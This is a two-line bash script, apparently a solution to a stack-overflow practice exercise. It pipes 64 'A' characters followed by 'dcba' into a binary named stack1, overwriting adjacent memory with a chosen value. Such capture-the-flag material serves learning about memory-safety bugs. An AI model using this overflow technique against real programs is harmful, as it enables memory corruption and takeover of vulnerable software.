#!/bin/bash
# Simple buffer overflow
echo -n 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba' | xargs ./stack1
